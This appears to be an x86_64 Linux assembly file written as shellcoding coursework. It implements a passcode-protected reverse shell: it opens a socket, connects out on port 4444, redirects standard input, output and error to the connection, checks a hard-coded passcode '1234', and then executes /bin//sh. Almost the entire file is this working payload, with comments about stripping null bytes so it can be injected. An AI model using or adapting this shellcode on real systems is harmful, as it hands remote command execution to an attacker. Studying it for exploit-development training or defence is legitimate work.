; David @InfinitelyManic
; Code provide|inspired by  http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/
; connect back shell or reverse bind shell
; create passcode auth
; remove the nulls later
; shrink code 

section .text
        global _start

_start:
        ; man 2 syscall
        ;  x86_64        rdi   rsi   rdx   r10   r8    r9    -

        ; socket(int domain, int type, int protocol);

        ; domain argument specifies communication domain; this selects protocol family
        ;  AF_INET IPv4 Internet protocols

        ; type, which specifies the communication semantics
        ; SOCK_STREAM

        ; socket = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1

        ; syscall number 41
;        xor rax, rax
 ;       mov al, 41              ; syscall
	push byte 41
	pop rax
;        xor rdi, rdi
 ;       add di, 2               ; domain
	push byte 2
	pop rdi
;        xor rsi, rsi
 ;       inc rsi
	push byte 1
	pop rsi
        xor edx, edx
        syscall
                                ; socket descriptor returned in rax
        ; copy socket descriptor to rdi for future use
        mov rdi, rax            ; save sockfd

        ; struct sockaddr...
        ; set up data structure on stack
        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)
        xor eax, eax                            ; init eight bytes to 0
        push rax                                ; 0x0000 0000 0000 0000

        mov dword [rsp-4], eax                  ; 0x0000 0000
        mov word [rsp-6], 0x5c11                ; PORT  (4444 == 0x115c)  - placed on the stack in network order == big endian
        mov word [rsp-8], 0x02                  ; DOMAIN 0002                   domain
        sub rsp, 8                              ; 0x0000 0000 5c11 0002

        ; connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        ;               rdi                      rsi                  rdx
        ; syscall number 42
        ; connect
;        xor rax, rax
 ;       mov al, 42                              ; syscall connect
	push byte 42
	pop rax
        ; rdi                                   ; sockfd
        mov rsi, rsp                            ; 0x0000 0000 5c11 0002
;        xor rdx, rdx
 ;       add dl, 16                              ; length of 16 byes or 32 bits for IPv4
	push byte 16
	pop rdx 
        syscall


        ; store the client socket description
        mov r9, rax


       ; duplicate sockets
        ; int dup2(int oldfd, int newfd);
        ; p2()
        ; The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the descriptor number spec
        ; -ified in newfd.  If the descriptor newfd was previously open, it is silently closed before being reused.
        ; dup2 (new, old)
        ;xor rax, rax
        ;add al, 33
	push byte 33
	pop rax
        ; rdi
        xor esi, esi
        syscall

        ;xor rax, rax
        ;add al, 33
	push byte 33
	pop rax
        ; rdi
;        xor rsi, rsi
 ;       inc rsi
	push byte 1
	pop rsi 
        syscall

        ;xor rax, rax
        ;add al, 33
	push byte 33
	pop rax
        ; rdi
        xor esi, esi
        ;inc rsi
        ;inc rsi
	push byte 2
	pop rsi 
        ;mov rsi, 2             ; newfd = std error
        syscall

        ; ***************************************************************************************
        ; ************* prompt for passc0de w/o nulls; buffer on stack *************************
        ; rev <<< "Enter 4 digit passcode: " | xxd -c8 -ps
        ; 203a65646f637373
        ; 6170207469676964
        ; 2034207265746e45

        mov rax, 0x203a65646f637373
        mov rbx, 0x6170207469676964
        mov rcx, 0x2034207265746e45

        push rax
        push rbx
        push rcx

	push byte 1
	pop rax				; syscall write        
	mov rdi, r9			; sockfd
        mov rsi, rsp			; buffer
	push byte 25
	pop rdx				; $ echo "Enter 4 digit passcode: " | wc = 25
	syscall
        ; *******************************************************

        ; *****get passcode **************************************
        xor eax, eax                    ; you can use read 0 | recvfrom 45 | recvmsg 47
        mov rdi, r9                     ; sockfd
        mov rsi, rsp                    ; buffer - put it on the stack
	push byte 4			; len
	pop rdx
;       the items below are for using recvfrom | recvmsg
;       xor rcx, rcx                    ; flags
;       xor r8, r8                      ; null
;       xor r9,r9                       ; 0
        syscall
        ; ********check passc0de **************************************:
        mov eax, dword [rsp]
        cmp eax, 0x34333231             ; passcode 1234 in ASCII backwards
        je _shell
        ; ***************************************************************************************
        ; ***************************************************************************************
_exit:
        ; _exit if wrong passcode ; alternatively, continue to ask for passcode
	push byte 60
	pop rax
        xor edi, edi
        syscall
        ; *******************************************************

_shell:

        ; execve *************************************
        ; First NULL push
        xor eax, eax
        push rax

        ; push /bin//sh in reverse
        ;mov rbx, 0x68732f2f6e69622f
	mov rbx, '/bin//sh'
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi

        ; set RSI
        mov rsi, rsp

        ; Call the Execve syscall
;        xor rax, rax
 ;       add al, 59
	push byte 59
	pop rax
        syscall
